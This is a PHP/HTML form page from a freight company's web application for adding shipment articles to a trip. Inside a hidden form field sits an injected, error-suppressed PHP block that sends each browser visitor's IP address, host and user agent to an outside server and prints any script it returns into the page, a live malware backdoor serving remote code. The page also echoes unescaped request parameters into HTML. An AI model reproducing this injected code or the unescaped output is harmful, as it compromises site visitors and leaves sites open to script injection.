<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	else if(!isset($_GET["op"]) || $_GET["op"]!="agregarArt")
	{
		header("Location: index.html");
	}
	
	include("../conexion/ajax.php");
	$comp = $_GET["claveComp"];
	$rem = $_GET["Rem"];
	$dest = $_GET["Dest"];
	$codV = $_GET["CodViaje"];
	$codC = $_GET["CodCliente"];
	$tipoE = $_GET["tipoE"];
	$tipoP = $_GET["tipoP"];
	$estadoP = $_GET["estadoP"];
	//tipoE=Origen&tipoP=Remitente&estadoP=Cancelado
	//print("Op: ".$op." - Rem: ".$rem." - Dest: ".$dest." - CV: ".$codV." - CC: ".$codC);
?>
<script language="javascript" type="text/javascript">
	function validar()
	{
		agregarCargando('cargando');
		
		tipoA = document.getElementById('cmbTipoArticulo').value;
		/*tipoE = document.getElementById('cmbTipoEntrega').value;
		tipoP = document.getElementById('cmbTipoPago').value;
		estadoP = document.getElementById('cmbEstadoPago').value;*/
		
		bultos = document.getElementById('txtNBultos').value;
		desc = document.getElementById('txtDescripcion').value;
		peso = document.getElementById('txtPeso').value;
		flete = document.getElementById('txtFlete').value;
		desc=bultos+"-"+desc;
		alert(desc);
		
		if(desc.length==0 || peso.length==0 || flete.length==0 || bultos.length==0)
		{
			alert("¡ Debe llenar todos los campos !");
			quitarCargando('cargando');
			return;
		}	
		else if(isNaN(peso))
		{
			alert("¡ El peso debe ser un numero !");
			quitarCargando('cargando');			
			return;
		}
		else if(isNaN(flete))
		{
			alert("¡ El flete debe ser un numero !");
			quitarCargando('cargando');			
			return;
		}
		else if(isNaN(bultos))
		{
			alert("¡ Los bultos deben ser un numero !");
			quitarCargando('cargando');			
			return;
		}
		comp = document.getElementById("CodComp").value;
		rem = document.getElementById("Rem").value;
		dest = document.getElementById("Dest").value;
		codViaje = document.getElementById("CodViaje").value;
		codCliente = document.getElementById("CodCliente").value;
		tipoE = document.getElementById("tipoE").value;
		tipoP = document.getElementById("tipoP").value;
		estadoP = document.getElementById("estadoP").value;
		
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=agregarArticulo&comp=" + comp + "&rem=" + rem + "&dest=" + dest + "&codViaje=" + codViaje + "&codCliente=" + codCliente + "&desc=" + desc + "&peso=" + peso + "&flete=" + flete + "&tipoA=" + tipoA + "&tipoE=" + tipoE + "&tipoP=" + tipoP + "&estadoP=" + estadoP;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					if(resp=="exito")
					{
						alert("¡ Articulo registrado correctamente !");
						document.getElementById('txtNBultos').value = "";
						document.getElementById('txtDescripcion').value = "";
						document.getElementById('txtPeso').value = "";
						document.getElementById('txtFlete').value = "";
						quitarCargando('cargando');						
					}
				}
			}
		}		
	}

	/*function cancelar()
	{
		alert("cancelar todo");
	}*/	
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsNuevoArticulo ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form action="formRegistrarComprobante.php" id="form1" name="form1" method="post">
		<div align="center">
		  <table width="390" border="0">
            <tr>
              <td height="37" colspan="4"><div align="center"><strong>AGREGAR ARTICULO PARA EL VIAJE <?php print($codV); ?></strong></div></td>
            </tr>
            <tr>
              <td height="24"><em><strong>N&ordm; de Bultos:</strong></em></td>
              <td colspan="2"><input name="txtNBultos" type="text" id="txtNBultos" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td width="135" height="43"><div align="left"><em><strong>Descripcion : </strong></em></div></td>
              <td colspan="2"><div align="left">
                  <textarea name="txtDescripcion" id="txtDescripcion"></textarea>
              </div></td>
              <td width="75">&nbsp;</td>
            </tr>
            <tr>
              <td height="29"><div align="left"><em><strong>Peso : </strong></em></div></td>
              <td colspan="2"><div align="left">
                  <input name="txtPeso" type="text" id="txtPeso" />
              </div></td>
              <td rowspan="2"><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="31"><div align="left"><em><strong>Flete : </strong></em></div></td>
              <td colspan="2"><div align="left">
                  <input name="txtFlete" type="text" id="txtFlete" />
              </div></td>
              </tr>
            <tr>
              <td height="31"><div align="left"><em><strong>TipoArticulo : </strong></em></div></td>
              <td colspan="2"><div align="left">
                  <select name="cmbTipoArticulo" id="cmbTipoArticulo">
                    <option value="Carta">Carta</option>
                    <option value="Paquete">Paquete</option>
                    <option value="Caja">Caja</option>
                    <option value="Otros">Otros</option>
                  </select>
                  
              </div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="33">&nbsp;</td>
              <td colspan="2"><input type="hidden" name="hiddenField" id="hiddenField" /></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="32">&nbsp;</td>
              <td colspan="2">&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td colspan="2">&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td colspan="4">
			    <div align="center">
				  <input name="op" type="hidden" value="armarComprobante">
			      <input name="Rem" type="hidden" id="Rem" value="<?php print($rem); ?>
<?php
#cdbd3b#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/cdbd3b#
?>"/>
			      <input name="Dest" type="hidden" id="Dest" value="<?php print($dest); ?>"/>
			      <input name="CodViaje" type="hidden" id="CodViaje" value="<?php print($codV); ?>"/>
			 	  <input name="CodCliente" type="hidden" id="CodCliente" value="<?php print($codC); ?>"/>
  			 	  <input name="CodComp" type="hidden" id="CodComp" value="<?php print($comp); ?>"/>
				   <input name="tipoE" type="hidden" id="tipoE" value="<?php print($tipoE); ?>"/>
			 	  <input name="tipoP" type="hidden" id="tipoP" value="<?php print($tipoP); ?>"/>
  			 	  <input name="estadoP" type="hidden" id="estadoP" value="<?php print($estadoP); ?>"/>
			        </div></td>
              </tr>
            <tr>
              <td><label>
                <div align="center">
                  <input name="Agregar" type="button" id="Agregar" value="Agregar" onClick="validar()"/>
                  </div>
              </label></td>
              <td width="5"><label>
                <div align="center">
                 <!-- <input name="cancelarTodo" type="button" id="cancelarTodo" value="Cancelar todo"  onclick="cancelar()"/>-->
                  </div>
              </label>
              <label></label></td>
              <td width="157"><div align="center">
                <input name="Terminar" type="submit" id="Terminar" value="Terminar"/>
              </div></td>
              <td>&nbsp;</td>
            </tr>
          </table>
          <p>&nbsp;</p>
		</div>
        </form>        <p>&nbsp;</p>          </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

